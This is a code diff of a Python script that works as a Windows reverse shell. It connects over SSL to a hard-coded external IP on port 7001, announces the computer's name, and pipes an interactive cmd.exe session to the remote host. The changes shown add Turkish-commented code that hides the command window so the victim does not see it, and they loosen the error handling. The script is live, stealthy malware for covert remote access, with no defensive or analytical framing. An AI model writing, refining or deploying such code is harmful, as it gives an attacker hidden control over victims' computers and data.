@@ -2,7 +2,6 @@ import socket
 import ssl
 import subprocess
 import threading
-import sys
 import os
 
 def pipe_stream(source, destination):
@@ -22,7 +21,6 @@ def pipe_stream(source, destination):
 def connect_back():
     h = '185.194.175.132'
     p = 7001
-    
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
@@ -37,8 +35,16 @@ def connect_back():
         computer_name = os.environ.get("COMPUTERNAME", "PC")
         ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\n".encode())
         
+        # Windows pencere gizleme ayarları
+        si = subprocess.STARTUPINFO()
+        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        si.wShowWindow = 0  # SW_HIDE: Pencereyi tamamen gizler
+        
+        # Süreç gizleme bayrakları ile cmd.exe başlatılıyor
         proc = subprocess.Popen(
             ['cmd.exe'],
+            startupinfo=si,
+            creationflags=subprocess.CREATE_NO_WINDOW,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
@@ -54,12 +60,13 @@ def connect_back():
         t3.start()
         
         proc.wait()
-        
-    except Exception as e:
+    except:
         pass
     finally:
-        try: s.close()
-        except: pass
+        try:
+            s.close()
+        except:
+            pass
 
 if __name__ == "__main__":
     connect_back()
